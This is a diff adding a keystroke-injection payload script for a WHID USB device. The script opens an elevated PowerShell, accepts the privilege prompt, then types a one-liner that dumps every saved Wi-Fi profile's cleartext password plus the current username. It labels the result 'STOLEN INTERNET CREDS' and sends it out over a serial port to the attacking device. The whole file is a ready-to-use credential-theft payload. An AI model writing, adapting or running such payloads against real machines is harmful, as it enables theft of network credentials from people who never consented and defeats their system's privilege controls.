@@ -1,0 +1,8 @@
+Rem:Initial Payload created by @TravisPooley https://github.com/TravisPooley/WHID-Payloads
+Rem:Fixed Password Length bug
+Press:131+114
+PrintLine:powershell Start-Process PowerShell -Verb RunAs
+CustomDelay:2000
+Press:130+121
+CustomDelay:1000
+PrintLine:$n = "STOLEN INTERNET CREDS FROM:";$n += whoami;$n += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String; $s=(Get-WmiObject -Class Win32_PnPEntity -Namespace 'root\CIMV2' -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption; $com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value;$port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;$port.open();ForEach ($l in $($n -split "`r`n")){$port.WriteLine("SerialEXFIL:$l");}; $port.Close();exit;
